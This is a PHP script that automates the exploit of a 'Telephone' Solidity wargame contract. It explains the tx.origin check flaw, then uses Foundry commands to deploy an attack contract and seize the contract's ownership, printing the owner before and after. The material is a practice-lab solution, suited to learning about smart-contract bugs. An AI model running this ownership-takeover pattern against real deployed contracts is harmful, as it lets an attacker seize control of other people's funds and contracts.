<?php 
include "prepare.php";
if (!$_POST):
?>
<pre>
<b>Why Telephone.sol is vulnerable?</b>

The contract checks:

    if (tx.origin != msg.sender)

This is backwards. It ALLOWS changing the owner when the call
comes from a contract (msg.sender = hackContract), instead of blocking it.

To exploit it, we must call changeOwner() THROUGH a contract.

This script:
1. Deploys TelephoneHack.sol automatically
2. Calls hack.attack(contract, player)
3. Changes the owner successfully

</pre>

<?php
exit;
endif;

echo "<pre>";

echo "<div style='color:red;font-size:22px;font-weight:bold;padding:5px;'>
=== Selected Contract & Account ===
</div>";

echo "Contract:     $CONTRACT\n";
echo "Player Index: $PLAYER_ID\n";
echo "Player Addr:  $PLAYER\n\n";


// ---------------------------------------------------------------
// BEFORE
// ---------------------------------------------------------------
echo "=== OWNER BEFORE ===\n";
echo cast("cast call $CONTRACT \"owner()\" --rpc-url $RPC");


// ---------------------------------------------------------------
// DEPLOY HACK CONTRACT
// ---------------------------------------------------------------
echo "\n=== DEPLOYING TelephoneHack ===\n";

$cmd = "forge create --json --broadcast ./src/TelephoneHack.sol:TelephoneHack "
     . "--private-key $PK --rpc-url $RPC";

$raw = cast($cmd . " 2>&1");
echo $raw . "\n";

$hackAddress = null;

// JSON mode
if (preg_match('/"deployedTo"\s*:\s*"([^"]+)"/', $raw, $m)) {
    $hackAddress = trim($m[1]);
}
// Text mode fallback
elseif (preg_match('/Deployed to:\s*(0x[0-9a-fA-F]{40})/', $raw, $m)) {
    $hackAddress = trim($m[1]);
}

if (!$hackAddress) {
    echo "Failed to deploy hack contract.\n";
    exit;
}

echo "Hack contract deployed at: $hackAddress\n";


// ---------------------------------------------------------------
// EXECUTE EXPLOIT
// ---------------------------------------------------------------
echo "\n=== EXECUTING EXPLOIT (HACK CONTRACT CALL) ===\n";

echo cast(
    "cast send $hackAddress \"attack(address,address)\" $CONTRACT $PLAYER " .
    "--rpc-url $RPC --private-key $PK"
);


// ---------------------------------------------------------------
// AFTER
// ---------------------------------------------------------------
echo "\n<div style='color:red;font-size:22px;font-weight:bold;padding:5px;'>
=== OWNER AFTER EXPLOIT ===
</div>";

echo cast("cast call $CONTRACT \"owner()\" --rpc-url $RPC");

echo "</pre>";
?>
